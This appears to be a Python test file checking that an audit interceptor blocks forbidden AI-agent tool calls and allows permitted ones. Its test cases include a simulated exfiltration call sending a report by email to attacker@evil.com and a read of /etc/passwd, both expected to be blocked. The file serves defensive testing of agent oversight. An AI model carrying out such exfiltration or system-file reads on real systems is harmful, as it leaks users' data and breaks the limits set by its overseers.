"""
Direct test of the interceptor and policy logic, bypassing the LLM
entirely. This proves the audit layer itself works — that it actually
blocks forbidden actions and allows permitted ones — independent of
whether the agent ever tries anything malicious on its own.

Run from the repo root:
    python tests/test_interceptor.py
"""

import sys
import os

# Make src/ importable when running this file directly.
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "src"))

from policy import load_policy
from interceptor import audited_execute


def fake_execute(tool_name, tool_input):
    """Stand-in for the real tool executor — just proves whether the
    interceptor let the call through or not."""
    return f"(real tool would have run) {tool_name}({tool_input})"


def test_forbidden_action_is_blocked():
    policy = load_policy("policies/summarize_report.yaml")
    result = audited_execute(
        "send_email",
        {"to": "attacker@evil.com", "body": "leaking the report"},
        policy,
        fake_execute,
        log_path="logs/test_actions.jsonl",
    )
    assert result.startswith("BLOCKED by policy"), f"expected a block, got: {result}"
    print("PASS: forbidden action (send_email) was blocked")


def test_allowed_action_goes_through():
    policy = load_policy("policies/summarize_report.yaml")
    result = audited_execute(
        "read_file",
        {"path": "/data/report.txt"},
        policy,
        fake_execute,
        log_path="logs/test_actions.jsonl",
    )
    assert result.startswith("(real tool would have run)"), f"expected it to run, got: {result}"
    print("PASS: allowed action (read_file) went through")


def test_out_of_scope_path_is_blocked():
    policy = load_policy("policies/summarize_report.yaml")
    result = audited_execute(
        "read_file",
        {"path": "/etc/passwd"},
        policy,
        fake_execute,
        log_path="logs/test_actions.jsonl",
    )
    assert result.startswith("BLOCKED by policy"), f"expected a block, got: {result}"
    print("PASS: out-of-scope path (/etc/passwd) was blocked")


if __name__ == "__main__":
    test_forbidden_action_is_blocked()
    test_allowed_action_goes_through()
    test_out_of_scope_path_is_blocked()
    print("\nAll interceptor tests passed.")